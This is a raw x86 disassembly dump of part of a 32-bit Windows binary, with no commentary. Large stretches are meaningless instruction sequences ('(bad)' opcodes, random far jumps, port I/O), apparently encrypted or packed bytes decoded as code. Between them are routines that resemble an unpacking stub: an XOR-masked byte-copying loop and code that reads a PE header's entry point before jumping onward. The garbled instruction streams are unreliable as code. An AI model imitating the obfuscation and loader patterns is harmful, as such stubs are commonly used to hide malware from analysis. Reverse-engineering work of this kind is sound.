  406180:	mov    al,0x64
  406182:	adc    BYTE PTR [edi+eiz*4+0x2b7c0117],bh
  406189:	jp     0x4061b8
  40618b:	or     edx,DWORD PTR [edx]
  40618d:	inc    edx
  40618e:	not    DWORD PTR [esi-0x28bf717d]
  406194:	and    ecx,esp
  406196:	add    dl,al
  406198:	mul    BYTE PTR ds:0xbd6fe01f
  40619e:	sub    ebp,eax
  4061a0:	sbb    al,0x64
  4061a2:	jmp    0x4a75:0x54cd8b63
  4061a9:	or     al,BYTE PTR [edx+0x14]
  4061ac:	mov    bl,0x6f
  4061ae:	ror    cl,0xc3
  4061b1:	cwde   
  4061b2:	sar    esi,cl
  4061b4:	call   0x1b17:0xd580a928
  4061bb:	dec    esi
  4061bc:	daa    
  4061bd:	sub    bh,bl
  4061bf:	pcmpgtw mm6,QWORD PTR [ebx-0x3f]
  4061c3:	jns    0x4061e1
  4061c5:	out    0x74,al
  4061c7:	in     eax,dx
  4061c8:	cmp    cl,BYTE PTR [edx+0x2293651c]
  4061ce:	addr16 ret 
  4061d0:	lock aam 0xc3
  4061d3:	in     eax,0xa5
  4061d5:	xchg   edx,eax
  4061d6:	sub    DWORD PTR ds:0xbab0853c,0x681ac8e9
  4061e0:	or     eax,0x90ea547b
  4061e5:	sub    ch,bl
  4061e7:	mov    bh,0x7
  4061e9:	cmp    al,0xb
  4061eb:	test   eax,0x3b4f1b19
  4061f0:	popf   
  4061f1:	pop    eax
  4061f2:	cmp    esp,0x66
  4061f5:	dec    ecx
  4061f6:	mov    eax,ds:0x9e4e582a
  4061fb:	or     al,0xb1
  4061fd:	jmp    0xf7c2:0x656fd4f2
  406204:	and    ch,BYTE PTR [ebp-0x59340dd7]
  40620a:	push   esp
  40620b:	addr16 popf 
  40620d:	jb     0x40624f
  40620f:	addr16 push es
  406211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406212:	pop    es
  406213:	lahf   
  406214:	sbb    eax,DWORD PTR [ebp+eax*4+0x588a4cb2]
  40621b:	pop    ss
  40621c:	addr16 lahf 
  40621e:	ins    BYTE PTR es:[edi],dx
  40621f:	rcr    BYTE PTR [ebx-0x2a4f7b10],1
  406225:	adc    eax,0x609480eb
  40622a:	fwait
  40622b:	ins    DWORD PTR es:[edi],dx
  40622c:	sbb    BYTE PTR [ebp+0x21976c2],cl
  406232:	pop    ds
  406233:	pop    esp
  406234:	mov    esi,DWORD PTR [edx-0x7b4c4e42]
  40623a:	icebp  
  40623b:	adc    al,0x60
  40623d:	out    dx,al
  40623e:	mov    ds:0x65371e2c,al
  406243:	call   0x6646:0x7134cab4
  40624a:	test   DWORD PTR [esi+0x6f1440ae],0x7a0ca839
  406254:	jae    0x40625d
  406256:	sbb    DWORD PTR [ebp+0x52],esp
  406259:	adc    ebx,ebp
  40625b:	fadd   DWORD PTR [ebp-0x7383a106]
  406261:	stc    
  406262:	sub    esi,ebx
  406264:	int3   
  406265:	xor    DWORD PTR [ecx],eax
  406267:	mov    cl,0x4a
  406269:	mov    DWORD PTR [ebp+0x4237be24],eax
  40626f:	lods   eax,DWORD PTR ds:[esi]
  406270:	jmp    0x82470f0
  406275:	dec    ebx
  406276:	or     ebx,ebx
  406278:	xchg   edi,eax
  406279:	in     eax,dx
  40627a:	add    ebx,esp
  40627c:	inc    esi
  40627d:	dec    ebx
  40627e:	xchg   ecx,eax
  40627f:	xor    ah,cl
  406281:	push   ebx
  406282:	xchg   edi,eax
  406283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406284:	iret   
  406285:	jle    0x4062a1
  406287:	add    al,0x5f
  406289:	mov    cl,0x8d
  40628b:	add    al,0xf8
  40628d:	sti    
  40628e:	ror    eax,1
  406290:	mov    dl,0x52
  406292:	sbb    al,0xcb
  406294:	nop
  406295:	shl    DWORD PTR [ebx],1
  406297:	fcomp  DWORD PTR [esi]
  406299:	pop    edx
  40629a:	int3   
  40629b:	sar    BYTE PTR [ebp+0x53],1
  40629e:	ret    0x86ca
  4062a1:	mov    dl,0x35
  4062a3:	or     DWORD PTR [ecx-0x406e7851],esi
  4062a9:	mov    esi,DWORD PTR [esi]
  4062ab:	jo     0x406302
  4062ad:	(bad)  
  4062ae:	pop    ebp
  4062af:	pop    ss
  4062b0:	fidivr DWORD PTR [esi]
  4062b2:	mov    al,ds:0x4a6bcbb9
  4062b7:	xor    bh,dl
  4062b9:	and    ecx,DWORD PTR [edx+0x70]
  4062bc:	mov    eax,0x849fc058
  4062c1:	ins    DWORD PTR es:[edi],dx
  4062c2:	outs   dx,BYTE PTR ds:[esi]
  4062c4:	dec    ecx
  4062c5:	mov    ebp,0x3b6fd677
  4062ca:	cmp    BYTE PTR [ebp+0x27],dl
  4062cd:	adc    BYTE PTR [esi+0x6c],bl
  4062d0:	inc    edi
  4062d1:	sub    DWORD PTR [esi+esi*2+0x610e51cf],esp
  4062d8:	xchg   edi,eax
  4062d9:	int    0x30
  4062db:	cmc    
  4062dc:	shr    esi,1
  4062de:	(bad)  [edx+eiz*2+0x7dc652f0]
  4062e5:	pop    ecx
  4062e6:	xor    DWORD PTR [esi-0x19],ecx
  4062e9:	je     0x406362
  4062eb:	icebp  
  4062ec:	imul   ecx,edi,0xdb9daf6b
  4062f2:	jge    0x406362
  4062f4:	in     al,0xb4
  4062f6:	loopne 0x4062a4
  4062f8:	outs   dx,BYTE PTR ds:[esi]
  4062f9:	and    BYTE PTR [ebp+0x78],ch
  4062fc:	loopne 0x406285
  4062fe:	loopne 0x4062e5
  406300:	inc    esi
  406301:	js     0x406367
  406303:	mov    ch,0xc8
  406305:	(bad)  
  406306:	xchg   ecx,eax
  406307:	int3   
  406308:	lods   eax,DWORD PTR ds:[esi]
  406309:	pop    edi
  40630a:	rcl    DWORD PTR [ebx],0xc5
  40630d:	xchg   esi,eax
  40630e:	sbb    al,0xc4
  406310:	xchg   ebx,eax
  406311:	mov    esi,DWORD PTR [ebp+0x5343968b]
  406317:	out    dx,eax
  406318:	sbb    ecx,DWORD PTR [eax*4+0x7510e656]
  40631f:	shl    cl,0xbb
  406322:	rol    DWORD PTR es:[eax],1
  406325:	repz mov edi,eax
  406328:	cmp    ch,0x5c
  40632b:	xchg   edx,eax
  40632c:	xor    eax,0x89ec212d
  406331:	inc    esp
  406332:	stos   DWORD PTR es:[edi],eax
  406333:	jmp    0xc630:0x8f93b927
  40633a:	fdiv   DWORD PTR [eax+0x3710814c]
  406340:	inc    ebx
  406341:	adc    DWORD PTR ds:0xe1b0d1ff,esp
  406347:	imul   esi,edx,0x4533fe52
  40634d:	daa    
  40634e:	fcomp  QWORD PTR [ebp+0x7c22501b]
  406354:	dec    esi
  406355:	cwde   
  406356:	sbb    esi,DWORD PTR [ebp-0x1d3f052f]
  40635c:	pcmpeqw mm1,QWORD PTR [eax+0x5c62489]
  406363:	popa   
  406364:	pop    ebp
  406365:	nop
  406366:	enter  0xa5b3,0x3
  40636a:	nop
  40636b:	and    al,BYTE PTR [eax-0x62]
  40636e:	sbb    DWORD PTR [esi+ecx*2],edi
  406371:	(bad)  
  406373:	shl    BYTE PTR [esi+0x4cbb0fdc],cl
  406379:	outs   dx,DWORD PTR ds:[esi]
  40637a:	xor    al,0xe
  40637c:	inc    esi
  40637d:	mov    al,BYTE PTR [ebp-0x2c]
  406380:	add    bh,dh
  406382:	mov    ah,0xfb
  406384:	daa    
  406385:	repz sbb BYTE PTR [esi],0xc3
  406389:	lock cwde 
  40638b:	sbb    eax,0x9b789d3e
  406390:	data16 scas al,BYTE PTR es:[edi]
  406392:	mov    al,0x2d
  406394:	add    bl,BYTE PTR [edi+ebp*4-0x38]
  406398:	in     al,0x2c
  40639a:	fst    DWORD PTR [edx]
  40639d:	loop   0x4063d8
  40639f:	mov    eax,edi
  4063a1:	mov    bl,ah
  4063a3:	inc    edi
  4063a4:	dec    ebx
  4063a6:	add    BYTE PTR [ecx-0x44],bl
  4063a9:	icebp  
  4063aa:	clc    
  4063ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ac:	jbe    0x406344
  4063ae:	fst    QWORD PTR [ebx+0x12]
  4063b1:	lods   eax,DWORD PTR ds:[esi]
  4063b2:	adc    ch,0xa8
  4063b5:	pop    ds
  4063b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063b8:	adc    esp,ebp
  4063ba:	sub    BYTE PTR [eax+0x63],ah
  4063bd:	push   ss
  4063be:	adc    DWORD PTR fs:[ebx-0x66],edx
  4063c2:	rcl    cl,1
  4063c4:	jge    0x4063f0
  4063c6:	pusha  
  4063c7:	fcomp  DWORD PTR ds:0x2e6e8fac
  4063cd:	jae    0x406448
  4063cf:	pop    edx
  4063d0:	push   eax
  4063d1:	dec    eax
  4063d2:	push   es
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	xor    dl,BYTE PTR [eax-0x7f]
  406461:	xchg   edx,eax
  406462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064d5
  40646b:	std    
  40646c:	adc    ecx,eax
  40646e:	test   DWORD PTR [ecx+0x6b],edi
  406471:	stos   DWORD PTR es:[edi],eax
  406472:	or     dl,ch
  406474:	(bad)  
  406475:	jae    0x406422
  406477:	mov    ebx,0xa5e237ef
  40647c:	(bad)  [ecx-0x79]
  40647f:	dec    esi
  406480:	inc    ebx
  406481:	ins    DWORD PTR es:[edi],dx
  406482:	pop    esp
  406483:	adc    eax,0xb01e130c
  406488:	xchg   ebp,eax
  406489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648a:	ins    DWORD PTR es:[edi],dx
  40648b:	lea    esp,[esi+0x29]
  40648e:	loope  0x4064a1
  406490:	dec    eax
  406491:	xchg   ebx,eax
  406492:	es jae 0x4064c7
  406495:	sub    ch,al
  406497:	popf   
  406498:	std    
  406499:	xchg   dx,ax
  40649b:	inc    edx
  40649c:	cdq    
  40649d:	scas   al,BYTE PTR es:[edi]
  40649e:	sbb    bl,BYTE PTR [eax+ebp*4]
  4064a1:	mov    WORD PTR [ebp-0x5cbdb8bc],ss
  4064a7:	xchg   ebx,eax
  4064a8:	pop    edx
  4064a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064aa:	outs   dx,DWORD PTR ds:[esi]
  4064ab:	jmp    0x406495
  4064ad:	xor    al,0x43
  4064af:	les    esi,FWORD PTR [esi]
  4064b1:	lods   al,BYTE PTR ds:[esi]
  4064b2:	stc    
  4064b3:	imul   al
  4064b5:	pushf  
  4064b6:	in     al,dx
  4064b7:	dec    edi
  4064b8:	mov    ah,0x47
  4064ba:	call   0xe3ba3b33
  4064bf:	sbb    ecx,DWORD PTR [ebx-0x245b273b]
  4064c5:	mov    dh,0xe0
  4064c7:	je     0x4064fa
  4064c9:	xchg   edx,eax
  4064ca:	jb     0x4064ed
  4064cc:	aad    0xd7
  4064ce:	retf   
  4064cf:	push   edi
  4064d0:	jo     0x4064fc
  4064d2:	test   al,0xff
  4064d4:	mov    edx,0x296e2ab9
  4064d9:	lods   al,BYTE PTR ds:[esi]
  4064da:	jne    0x4064d3
  4064dc:	aam    0xd4
  4064de:	jo     0x406466
  4064e0:	out    0xed,al
  4064e2:	xchg   ebx,eax
  4064e3:	pop    ebx
  4064e4:	test   al,0x9a
  4064e6:	imul   edi,esi,0x5f
  4064e9:	xor    al,0x15
  4064eb:	jmp    0x7911:0x59af13d2
  4064f2:	(bad)  
  4064f3:	ror    DWORD PTR [ebx+0x5c8d5937],1
  4064f9:	fimul  DWORD PTR [ecx+ecx*2+0x493c9b7b]
  406500:	mov    sp,0x3816
  406504:	sub    DWORD PTR [ebp-0x4771401d],0x75066c0c
  40650e:	adc    DWORD PTR [edx+esi*2-0x67],edi
  406512:	cmp    eax,0x2caed375
  406517:	stos   DWORD PTR es:[edi],eax
  406518:	cmp    DWORD PTR [bx+0x65],0x8
  40651d:	imul   ebp,DWORD PTR [ebp-0x601871ff],0x45891147
  406527:	inc    edx
  406528:	sub    esi,DWORD PTR [edx-0x37e98e7]
  40652e:	jmp    0xc4e76057
  406533:	mov    ch,0x46
  406535:	add    ecx,DWORD PTR [ebx-0x85c2fe3]
  40653b:	jae    0x406531
  40653d:	popf   
  40653e:	les    eax,FWORD PTR [ebx]
  406540:	call   0x1eb946c0
  406545:	dec    esp
  406546:	inc    esi
  406547:	push   0x6c1c95a8
  40654c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40654d:	sahf   
  40654e:	aas    
  40654f:	(bad)  
  406550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406551:	ins    BYTE PTR es:[edi],dx
  406552:	add    eax,0x74023a26
  406557:	(bad)  
  406558:	xor    ebx,edx
  40655a:	or     DWORD PTR [edx+0x38],eax
  40655d:	adc    bl,al
  40655f:	addr16 cmp ebx,esp
  406562:	sbb    eax,0x39e9acef
  406567:	add    DWORD PTR [edx+0x0],0x6b
  40656b:	pop    edx
  40656c:	mov    bl,0x63
  40656e:	out    dx,al
  40656f:	mov    ebx,0xf2fa303b
  406574:	call   0x1222:0x5f8f84b
  40657b:	fcomi  st,st(3)
  40657d:	jne    0x406569
  40657f:	popf   
  406580:	call   0x98b04565
  406585:	jge    0x4065b3
  406587:	test   BYTE PTR [ebx],cl
  406589:	mov    ?,edi
  40658b:	xor    eax,0xd411e4d8
  406590:	ret    0x3ad
  406593:	out    dx,al
  406594:	stos   DWORD PTR es:[edi],eax
  406595:	sbb    dh,BYTE PTR [ecx+0x9158e5b]
  40659b:	dec    edx
  40659c:	or     eax,0xa02d9521
  4065a1:	fnstcw WORD PTR ds:0x41c2773e
  4065a7:	(bad)  
  4065a8:	mov    ah,0xf0
  4065aa:	jmp    0x5a08:0xacba2e99
  4065b1:	enter  0x5800,0xa9
  4065b5:	jns    0x406539
  4065b7:	or     al,0xc7
  4065b9:	fbstp  TBYTE PTR [edx]
  4065bb:	out    0x4f,eax
  4065bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065be:	ret    0x49bb
  4065c1:	(bad)  
  4065c2:	push   eax
  4065c3:	xchg   ebx,eax
  4065c4:	or     ah,BYTE PTR [ebx-0x5298c01b]
  4065ca:	outs   dx,BYTE PTR ds:[esi]
  4065cb:	jne    0x40659c
  4065cd:	jmp    0x40656d
  4065cf:	push   eax
  4065d0:	jae    0x4065f3
  4065d2:	cmp    ah,0x10
  4065d5:	push   ss
  4065d6:	mov    eax,0x6f764a54
  4065db:	jmp    0x41c00e99
  4065e0:	jl     0x4065d2
  4065e2:	dec    ebx
  4065e3:	mov    BYTE PTR [eax+0x46],dh
  4065e6:	repnz inc eax
  4065e8:	ror    DWORD PTR [ebx-0x38756bc8],0x55
  4065ef:	call   0xe488:0xa9ca7b8b
  4065f6:	das    
  4065f7:	jle    0x40663d
  4065f9:	clc    
  4065fa:	mov    ebx,0xdb8b8e29
  4065ff:	and    eax,edx
  406601:	xchg   ecx,eax
  406602:	xor    esi,ebp
  406604:	pop    esi
  406605:	sti    
  406606:	and    dh,ah
  406608:	or     bh,BYTE PTR [edx+0x56]
  40660b:	shl    BYTE PTR [esi-0x4b],1
  40660e:	mov    eax,0x5c7cc59e
  406613:	je     0x4065b2
  406615:	dec    ebx
  406616:	inc    esp
  406617:	dec    ebp
  406618:	jge    0x4065b4
  40661a:	mov    ebx,0xd6df7c55
  40661f:	mov    DWORD PTR [edi+0x2f],esi
  406622:	sti    
  406623:	xchg   DWORD PTR [ebx+0x38],eax
  406626:	push   esi
  406627:	imul   ecx,DWORD PTR [esi-0x36e6c25b],0xffffffbc
  40662e:	icebp  
  40662f:	push   cs
  406630:	mov    ebp,0xe283e067
  406635:	xlat   BYTE PTR ds:[ebx]
  406636:	pushf  
  406637:	xchg   DWORD PTR [eax],edi
  406639:	lods   eax,DWORD PTR ds:[esi]
  40663a:	jns    0x4065ff
  40663c:	jb     0x4066bd
  40663e:	fidivr DWORD PTR [esp+edi*4]
  406641:	jne    0x406640
  406643:	jge    0x4066bb
  406645:	cmp    bl,BYTE PTR [esi+0x5321fa70]
  40664b:	pop    eax
  40664c:	push   edi
  40664d:	sub    ecx,edi
  40664f:	fdiv   QWORD PTR [ecx]
  406651:	idiv   DWORD PTR [ecx]
  406653:	mov    esi,0xaaa1fcf6
  406658:	inc    esi
  406659:	jb     0x406653
  40665b:	fst    st(6)
  40665d:	mul    DWORD PTR [eax-0x5aa1f7a0]
  406663:	(bad)  
  406664:	cmp    ebp,DWORD PTR [edx-0x48]
  406667:	cli    
  406668:	fist   DWORD PTR [edi+edi*1]
  40666b:	or     al,bh
  40666d:	imul   ebx,DWORD PTR [ebx+0x796141bf],0x152c414b
  406677:	ror    DWORD PTR [ecx],1
  406679:	(bad)  
  40667b:	fld    DWORD PTR [ebx]
  40667d:	call   0xa795:0x4aeca507
  406684:	xchg   edi,ebp
  406686:	mov    edi,0x2ad7bf4c
  40668b:	mov    eax,0x7f3c5c2f
  406690:	fmul   QWORD PTR ds:0xcef52245
  406696:	dec    ebx
  406697:	jae    0x40661f
  406699:	stc    
  40669a:	dec    edi
  40669b:	outs   dx,BYTE PTR ds:[esi]
  40669c:	ret    
  40669d:	dec    eax
  40669e:	ret    
  40669f:	pop    ss
  4066a0:	fwait
  4066a1:	pop    esp
  4066a2:	and    al,0xc8
  4066a4:	dec    ebx
  4066a5:	pop    ebp
  4066a6:	sbb    al,0x8c
  4066a8:	xor    DWORD PTR [ecx+0x7afa2855],eax
  4066ae:	ror    BYTE PTR [ecx],cl
  4066b0:	ss xor eax,0x8d12e0f2
  4066b6:	pusha  
  4066b7:	pusha  
  4066b8:	sub    ecx,DWORD PTR [edx]
  4066ba:	jnp    0x4066e2
  4066bc:	sbb    al,0x9c
  4066be:	jns    0x406660
  4066c0:	cmp    bh,BYTE PTR ds:0xca7307f0
  4066c6:	outs   dx,DWORD PTR ds:[esi]
  4066c7:	jnp    0x4066af
  4066c9:	ss (bad) 
  4066cb:	push   eax
  4066cc:	dec    edx
  4066cd:	stos   BYTE PTR es:[edi],al
  4066ce:	xchg   ecx,eax
  4066cf:	xor    DWORD PTR [edx],edx
  4066d1:	or     al,0xc9
  4066d3:	push   edi
  4066d4:	cs mov esi,0xd27d1fdd
  4066da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066db:	jl     0x4066cd
  4066dd:	dec    ebx
  4066de:	pavgw  mm4,mm4
  4066e1:	mov    dl,0x29
  4066e3:	es ret 0x344d
  4066e7:	pop    ecx
  4066e8:	fidivr WORD PTR [eax-0x4126a98f]
  4066ee:	retf   
  4066ef:	jle    0x406718
  4066f1:	adc    ebp,DWORD PTR [eax-0x50]
  4066f4:	add    cl,dh
  4066f6:	jmp    0xb4e05351
  4066fb:	lods   al,BYTE PTR ds:[esi]
  4066fc:	pop    esi
  4066fd:	and    al,0x6c
  4066ff:	mov    eax,ds:0x3c24b01b
  406704:	xchg   ecx,eax
  406705:	dec    ebx
  406706:	mov    ebp,0x72ed4bf0
  40670b:	outs   dx,DWORD PTR ds:[esi]
  40670c:	scas   eax,DWORD PTR es:[edi]
  40670d:	out    0x9f,al
  40670f:	pushf  
  406710:	jne    0x406747
  406712:	iret   
  406713:	push   edx
  406714:	leave  
  406715:	sahf   
  406716:	add    ebp,DWORD PTR [eax-0x10]
  406719:	repz ja 0x4066dd
  40671c:	aam    0x7c
  40671e:	ss pop eax
  406720:	xchg   ecx,eax
  406721:	pop    ss
  406722:	xchg   BYTE PTR cs:[ecx+0x3d06559b],al
  406729:	test   al,0x68
  40672b:	cmp    al,0x5e
  40672d:	and    DWORD PTR [edi-0x4e871805],eax
  406733:	fbld   TBYTE PTR fs:[esi]
  406736:	or     al,0x69
  406738:	lahf   
  406739:	jp     0x4066e0
  40673b:	imul   ebx,edi,0xffffffc9
  40673e:	or     bl,BYTE PTR [ecx]
  406740:	mov    cl,0xfb
  406743:	adc    DWORD PTR [ecx],ebx
  406745:	and    BYTE PTR [edx+ebx*1+0x57],dh
  406749:	push   ds
  40674a:	inc    edi
  40674b:	dec    ebx
  40674c:	add    al,0xdb
  40674e:	cmp    ebx,edi
  406750:	inc    eax
  406751:	xor    BYTE PTR [esp+ebp*4],dl
  406754:	push   0xf763f2dc
  406759:	xchg   ebp,eax
  40675a:	fadd   st(3),st
  40675c:	fadd   st(7),st
  40675e:	nop
  40675f:	nop
  406760:	fcom   st(5)
  406762:	add    eax,0xd4b040d5
  406767:	outs   dx,BYTE PTR ds:[esi]
  406768:	dec    ebp
  406769:	outs   dx,BYTE PTR ds:[esi]
  40676a:	dec    edi
  40676b:	mov    ebx,0xc4a0ccec
  406770:	cmp    cl,ah
  406772:	cmc    
  406773:	rol    bl,cl
  406775:	sahf   
  406776:	xchg   ebp,eax
  406777:	lds    edi,FWORD PTR [edx+0x36]
  40677a:	or     esi,DWORD PTR [edx]
  40677c:	sar    DWORD PTR [ecx+0x63],0x7b
  406780:	jnp    0x40674f
  406782:	mov    al,0xa5
  406784:	mov    eax,ds:0x60da87e3
  406789:	sub    ecx,DWORD PTR [ecx+edx*1-0x12]
  40678d:	dec    esp
  40678e:	les    edx,FWORD PTR [ebx-0x5e]
  406791:	mov    DWORD PTR fs:[edx+0x726f40cb],edi
  406798:	sahf   
  406799:	add    DWORD PTR [edx+0x27d8db7b],ecx
  40679f:	jmp    0x6e0b9a0d
  4067a4:	rol    edi,cl
  4067a6:	in     al,0x33
  4067a8:	clc    
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
